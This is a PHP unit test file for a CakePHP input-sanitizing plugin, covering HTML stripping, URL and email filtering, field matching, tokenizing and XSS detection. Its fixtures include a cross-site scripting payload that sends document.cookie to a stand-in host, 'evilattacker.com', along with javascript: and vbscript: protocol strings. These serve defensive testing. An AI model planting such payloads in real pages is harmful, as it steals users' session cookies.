<?php
/**
 * Unit Test for InputClean
 *
 * cake test In Lib/InputClean
 *
 * @package Input-CakePHP-Plugin
 * @link https://github.com/zeroasterisk/Input-CakePHP-Plugin
 */
App::uses('InputClean', 'Input.Lib');
App::uses('AppTestCase','Lib');

class InputCleanTest extends AppTestCase {

	public $fixtures = array();

	public function setUp() {
		parent::setUp();
		$this->InputClean = new InputClean;

		// all of these are potentially XSS attacks
		$this->xss = [
			0 => 'foobar<script>document.write(\'<iframe src="http://evilattacker.com?cookie=\'' . "\n" .
				' + document.cookie.escape() + \'" height=0 width=0 />\');</script>foobar',
			1 => 'foobar<a href="javascript:alert(1)">x</a>',
			2 => 'foobar<a href="#" style="danger">x</a>',
		];
	}

	public function tearDown() {
		parent::tearDown();
		unset($this->InputClean);
		ClassRegistry::flush();
	}

	public function testAllNoChanges() {
		$config = InputClean::configDefault();
		$v = [
			'abc' => 'abc',
			'Model' => [
				'name' => 'input cleaner',
				'email' => 'valid@example.com',
				'password' => '!@#$%^&*()',
				'url' => 'http://example.com/funky?something=1#anchor',
			]
		];
		$this->assertEqual(
			InputClean::all($v, $config),
			$v
		);
	}
	public function testAllChanges() {
		$config = InputClean::configDefault();
		$config['fields']['/.*\.html/'] = 'html';
		$config['fields']['/.*\.anything/'] = 'anything';
		$v = [
			'abc' => 'abc<a href="#htmlnotallowed">:(</a>',
			'html' => 'abc<a href="#htmlnotallowed">:(</a>',
			'anything' => 'abc<a href="#htmlnotallowed">:(</a>',
			'Model' => [
				'name' => 'input cleaner <strong>nohtml</strong>',
				'email' => 'valid@example.com#+subject=badcharfor' . "\n" . 'email',
				'password' => '!@#$%^&*()',
				'url' => 'http://example.com/funk'. "\n" . 'y?something=1#anchor',
				'html' => 'abc <a href="#html-allowed">:)</a>',
				'anything' => 'abc <a href="#html-allowed">:)</a>',
			]
		];
		$expect = [
			'abc' => 'abc:(',
			'html' => 'abc:(',
			'anything' => 'abc:(',
			'Model' => [
				'name' => 'input cleaner nohtml',
				'email' => 'valid@example.com#+subject=badcharforemail',
				'password' => '!@#$%^&*()',
				'url' => 'http://example.com/funky?something=1#anchor',
				'html' => 'abc <a href="#html-allowed">:)</a>',
				'anything' => 'abc <a href="#html-allowed">:)</a>',
			]
		];
		$this->assertEqual(
			InputClean::all($v, $config),
			$expect
		);
	}

	public function testFieldMatchDefault() {
		$pattern = '*';
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'basic')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.field')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.0.has_many')
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, '')
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, null)
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, false)
		);
		$this->assertFalse(
			InputClean::fieldMatch('', 'basic')
		);
	}

	public function testFieldMatchBasic() {
		$this->assertTrue(
			InputClean::fieldMatch('basic', 'basic')
		);
		$this->assertTrue(
			InputClean::fieldMatch('Model.field', 'Model.field')
		);
		$this->assertTrue(
			InputClean::fieldMatch('Model.0.has_many', 'Model.0.has_many')
		);
		$this->assertFalse(
			InputClean::fieldMatch('basic', 'Model.basic')
		);
		$this->assertFalse(
			inputclean::fieldmatch('basic', '.basic')
		);
		$this->assertFalse(
			inputclean::fieldmatch('basic', 'basic.')
		);
		$this->assertFalse(
			InputClean::fieldMatch('Model.field', 'Model.')
		);
		$this->assertFalse(
			InputClean::fieldMatch('Model.field', 'field')
		);
		$this->assertFalse(
			InputClean::fieldMatch('Model.field', '.field')
		);
		$this->assertFalse(
			InputClean::fieldMatch('Model.field', 'Mode*.field')
		);
		$this->assertFalse(
			InputClean::fieldMatch('Model.field', 'Mode%.field')
		);
		$this->assertFalse(
			InputClean::fieldMatch('Model.0.has_many', 'Model.1.has_many')
		);
	}

	public function testFieldMatchPregMatch() {
		$pattern = '/Model\..*field$/';
		$this->assertFalse(
			InputClean::fieldMatch($pattern, 'basic')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.field')
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, 'Model.0.has_many')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.0.has_many_field')
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, '')
		);

		$pattern = '/.*\.html/';
		$this->assertFalse(
			InputClean::fieldMatch($pattern, 'Model.0.has_many_html')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.0.html')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.0.html_withSuffix')
		);
	}

	public function testFieldMatchFnmatch() {
		$pattern = 'Model.*field';
		$this->assertFalse(
			InputClean::fieldMatch($pattern, 'basic')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.field')
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, 'Model.0.has_many')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.0.has_many_field')
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, '')
		);
	}

	public function testCleanField() {
		$config = InputClean::configDefault();
		$this->assertEqual(
			InputClean::cleanField('foo<strong>bar</strong> ' .
			'here', 'basic', $config),
			'foobar here'
		);
		// FILTER_SANITIZE_STRING (+ strip_tags)
		$this->assertEqual(
			InputClean::cleanField('foo<strong>bar</strong> ' .
			'here', 'Modle.basic', $config),
			'foobar here'
		);
		// FILTER_SANITIZE_URL
		// Remove all characters except letters, digits and
		// $-_.+!*'(),{}|\\^~[]`<>#%";/?:@&=.
		$this->assertEqual(
			InputClean::cleanField('http://exam'.
			"\n\r\t <>" . // << should be stripped
			'ple.com/path?query=1#anchor', 'Modle.url', $config),
			'http://example.com/path?query=1#anchor'
		);
		// FILTER_SANITIZE_EMAIL
		// Remove all characters except letters, digits and
		// !#$%&'*+-/=?^_`{|}~@.[].`
		$this->assertEqual(
			InputClean::cleanField('valid+target@exam'.
			"\n\r\t \"()<>" . // << should be stripped
			'ple.com?subject=funky', 'Modle.email', $config),
			'valid+target@example.com?subject=funky'
		);
	}

	public function testCleanAnything() {
	}
	public function testCleanBlacklist() {
		$config = InputClean::configDefault();
		$unchanged = [
			true, false, null, array(), $this, '', ' ',
			"foobar \n\r\t!@#$%^&*()`~[]{}(),.;'\"/\\|: foobar",
			"foobar > isolated GT allowed",
			"foobar &nbsp; entities allowed",
			htmlentities("foobar \n\r\t!@#$%^&*()`~[]{}(),.;'\"/\\|: foobar"),
			htmlentities('foobar <a href="#">escaped</a>')
		];
		foreach ($unchanged as $v) {
			$this->assertEqual(
				InputClean::clean($v, 'blacklist', $config),
				$v
			);
		}
	}

	public function testCleanString() {
		$config = InputClean::configDefault();
		$unchanged = [
			true, false, null, array(), $this, '', ' ',
			"foobar \n\r\t!@#$%^&*()`~[]{}(),.;'\"/\\|: foobar",
			"foobar > isolated GT allowed",
			"foobar &nbsp; entities allowed",
			htmlentities("foobar \n\r\t!@#$%^&*()`~[]{}(),.;'\"/\\|: foobar"),
			htmlentities('foobar <a href="#">escaped</a>')
		];
		foreach ($unchanged as $v) {
			$this->assertEqual(
				InputClean::clean($v, 'string', $config),
				$v
			);
		}

		$this->assertEqual(
			InputClean::clean("foobar < isolated LT not allowed (because of strip_tags)", 'string', $config),
			'foobar '
		);
		$this->assertEqual(
			InputClean::clean('foobar <a href="#" class="css" style="no xss">link</a> foobar', 'string', $config),
			'foobar link foobar'
		);
		$this->assertEqual(
			InputClean::clean('foobar <> no empty tag', 'string', $config),
			'foobar  no empty tag'
		);
		$this->assertEqual(
			InputClean::clean('foobar <!--e--> no comment tag', 'string', $config),
			'foobar  no comment tag'
		);
		$this->assertEqual(
			InputClean::clean('foobar <a href="#" no broken tag', 'string', $config),
			'foobar '
		);
		$this->assertEqual(
			InputClean::clean('foobar <!--e-- no broken comment tag', 'string', $config),
			'foobar '
		);

		// string XSS = always false (since HTML is stripped/sanitized)
		foreach ($this->xss as $i => $v) {
			// filter cleans string...  XSS doesn't find anything
			$r = InputClean::clean($v, 'string', $config);
			$this->assertFalse(empty($r));
		}
	}

	public function testCleanHtml() {
		$config = InputClean::configDefault();
		$unchanged = [
			true, false, null, array(), $this, '', ' ',
			"foobar \n\r\t!@#$%^&*()`~[]{}(),.;'\"/\\|: foobar",
			"foobar > isolated GT allowed",
			"foobar < isolated LT allowed",
			"foobar &nbsp; entities allowed",
			htmlentities("foobar \n\r\t!@#$%^&*()`~[]{}(),.;'\"/\\|: foobar"),
			htmlentities('foobar <a href="#">escaped</a>'),

			// HTML is allowed (but XSS will still throw exceptions)
			'foobar <a href="#" class="css">link</a> foobar',
			'foobar <> no empty tag',
			'foobar <a href="#" no broken tag',
			'foobar <!--e-- no broken comment tag',
		];
		foreach ($unchanged as $v) {
			$this->assertEqual(
				InputClean::clean($v, 'html', $config),
				$v
			);
		}

		// changing things, because we are still calling strip_scripts() for HTML
		$this->assertEqual(
			InputClean::clean('foobar <!--e--> no comment tag', 'html', $config),
			'foobar  no comment tag'
		);
		$this->assertEqual(
			InputClean::clean('foobar <script src="blah"></script> no script tag', 'html', $config),
			'foobar  no script tag'
		);
		$this->assertEqual(
			InputClean::clean('foobar <script>blah</script> no script tag', 'html', $config),
			'foobar  no script tag'
		);
		$this->assertEqual(
			InputClean::clean('foobar <iframe src="blah">blah</iframe> no iframe tag', 'html', $config),
			'foobar  no iframe tag'
		);

		// verify XSS

		//  unset strip_scripts so XSS is more likely to hit...
		$config['sanitizationKeyMap']['html']['strip_scripts'] = false;
		foreach ($this->xss as $i => $v) {
			// verify XSS Exception
			try {
				$r = InputClean::clean($v, 'html', $config);
				$this->assertEqual($r, '', 'Should have thrown an UnsafeInputException');
			} catch (UnsafeInputException $e) {
				$this->assertEqual(
					$e->getMessage(),
					sprintf('Unsafe Input Detected [hash: %s]',
						md5($v)
					)
				);
			}
			// no filter...  XSS Exception
			try {
				$r = InputClean::clean($v, ['filter' => false, 'xss' => true]);
				$this->assertEqual($r, '', 'Should have thrown an UnsafeInputException');
			} catch (UnsafeInputException $e) {
				$this->assertEqual(
					$e->getMessage(),
					sprintf('Unsafe Input Detected [hash: %s]',
						md5($v)
					)
				);
			}

			// no filter...  XSS doesn't run
			$this->assertEqual(
				InputClean::clean($v, ['filter' => false, 'xss' => false]),
				$v
			);

			// filter cleans string...  XSS doesn't run
			$r = InputClean::clean($v, ['filter' => FILTER_SANITIZE_STRING, 'xss' => false]);
			$this->assertFalse(empty($r));

			// filter cleans string...  XSS doesn't find anything
			$r = InputClean::clean($v, ['filter' => FILTER_SANITIZE_STRING, 'xss' => true]);
			$this->assertFalse(empty($r));
		}
	}

	public function testConfig() {
	}

	public function testDetectXSS() {

		$v = 'foobar<script>document.write(\'<iframe src="http://evilattacker.com?cookie=\'' . "\n" .
		' + document.cookie.escape() + \'" height=0 width=0 />\');</script>foobar';
		$this->assertTrue(InputClean::detectXSS($v));

		$v = 'foobar <script>...foobar';
		$this->assertTrue(InputClean::detectXSS($v));
		$v = 'foobar script...foobar';
		$this->assertFalse(InputClean::detectXSS($v));

		$v = 'foobar <a href="#" style="badstuff">foo</a>bar';
		$this->assertTrue(InputClean::detectXSS($v));
		$v = 'foobar <a href="#" class="badstuff">foo</a>bar';
		$this->assertFalse(InputClean::detectXSS($v));

		// fixed a problem with "data:123" matching
		$v = 'foobar data:100 yxz';
		$this->assertFalse(InputClean::detectXSS($v));
		$v = 'data:100';
		$this->assertFalse(InputClean::detectXSS($v));

		// some more known "bad" values
		//   javascript:, livescript:, vbscript: and mocha: protocols
		$v = 'javascript:foobar';
		$this->assertTrue(InputClean::detectXSS($v));
		$v = 'foobar javascript:foobar xyz';
		$this->assertTrue(InputClean::detectXSS($v));
		$v = 'foobarjavascript:foobarxyz';
		$this->assertTrue(InputClean::detectXSS($v));
		$v = 'foobarvbscript:foobarxyz';
		$this->assertTrue(InputClean::detectXSS($v));
		$v = 'foobarlivescript:foobarxyz';
		$this->assertTrue(InputClean::detectXSS($v));
		$v = 'foobarmocha:foobarxyz';
		$this->assertTrue(InputClean::detectXSS($v));
		// does not match script: protocol
		$v = 'foobarscript:foobarxyz';
		$this->assertFalse(InputClean::detectXSS($v));
		// does not match javascript= protocol
		$v = 'foobar javascript=foobar xyz';
		$this->assertFalse(InputClean::detectXSS($v));
		// does not match javascript protocol
		$v = 'foobar javascript xyz';
		$this->assertFalse(InputClean::detectXSS($v));

		// TODO: more tests to demonstrate functionality
	}



	// demonstrate that <email@example.com> is not stripped
	//   even though it normally would be in PHP, without this tokenize process
	public function testTokenizeInCleanEmailInArrows() {
		// this config should be on/set by default
		//   but putting it into this unit-test just to be "sure"
		$config = InputClean::configDefault();
		$config['sanitizationKeyMap']['string']['tokenize'] = ['emailInArrows'];
		// not found, normal
		$this->assertEqual(
			InputClean::clean('foobar <strong>html</strong>', 'string', $config),
			'foobar html'
		);
		// email in arrows found, and allowed "<$email>"
		//   this only makes it past strip_tags() because
		//   it's first tokenized, and then later, detokenized
		$this->assertEqual(
			InputClean::clean('foobar <email@example.com> <strong>html</strong>', 'string', $config),
			'foobar <email@example.com> html'
		);
	}

	// demonstrate that bad emails are not allowed / tokenized
	//   as such, they are stripped
	public function testTokenizeInCleanEmailInArrowsBademails() {
		// this config should be on/set by default
		//   but putting it into this unit-test just to be "sure"
		$config = InputClean::configDefault();
		$config['sanitizationKeyMap']['string']['tokenize'] = ['emailInArrows'];
		// here are a list of possible "bad" non-emails
		//   none of which should match our pattern
		//   so all of them should end up stripped (with the wrapping < >)
		$badEmails = [
			'non@email@example.com',
			'non_email_example_com',
			'non-email@examplecom',
			'non-email',
			'@example.com',
			'non-email@example.com ',
			' non-email@example.com',
			'non-em ail@example.com',
			"non-em\nail@example.com",
		];
		foreach ($badEmails as $badEmail) {
			$this->assertEqual(
				InputClean::clean("foobar <$badEmail> <strong>html</strong>", 'string', $config),
				'foobar  html'
			);
		}
	}

	// disable the emailInArrows tokenize config for string
	//   and verify that it no longer "allows" it through...
	public function testTokenizeInCleanEmailInArrowsDisable() {
		$config = InputClean::configDefault();
		$config['sanitizationKeyMap']['string']['tokenize'] = false;
		$this->assertEqual(
			InputClean::clean('foobar <email@example.com> <strong>html</strong>', 'string', $config),
			'foobar  html'
		);
	}

	// verify that the emailInArrows is defaulted to "on"
	//   just testing default config
	public function testTokenizeInConfigIncludesEmailInArrows() {
		$config = InputClean::configDefault();
		$this->assertTrue(
			in_array('emailInArrows', $config['sanitizationKeyMap']['string']['tokenize'])
		);
		$this->assertTrue(
			in_array('emailInArrows', $config['sanitizationKeyMap']['html']['tokenize'])
		);
	}

	public function testTokenize() {
		$this->assertEqual(
			InputClean::tokenize('foobar', []),
			'foobar'
		);
		$this->assertEqual(
			InputClean::tokenize('foobar', null),
			'foobar'
		);
		$this->assertEqual(
			InputClean::$tokens,
			[]
		);
		$result = InputClean::tokenize('foobar', ['#bar#']);
		$this->assertEqual(
			count(InputClean::$tokens),
			1
		);
		$token = key(InputClean::$tokens);
		$orig = current(InputClean::$tokens);
		$this->assertEqual(
			$result,
			"foo{$token}"
		);
		$this->assertEqual(
			$orig,
			'bar'
		);
	}

	public function testDetokenize() {
		InputClean::tokenizeReset();
		$this->assertEqual(
			InputClean::$tokens,
			[]
		);
		$this->assertEqual(
			InputClean::detokenize('foobar'),
			'foobar'
		);
		InputClean::$tokens = [
			// replaces case sensetive
			'b' => 'X',
			// replaces multiple instances
			'o' => 'x',
		];
		$this->assertEqual(
			InputClean::detokenize('foobarB'),
			'fxxXarB'
		);
		// auto-detokenize
		$this->assertEqual(
			InputClean::$tokens,
			[]
		);
	}

	public function testTokenizeReset() {
		InputClean::$tokens['abc'] = 'abc-foobar';
		InputClean::$tokens['xyz'] = 'xyz-foobar';
		$this->assertEqual(
			InputClean::tokenizeReset(),
			null
		);
		$this->assertEqual(
			InputClean::$tokens,
			[]
		);
	}

}

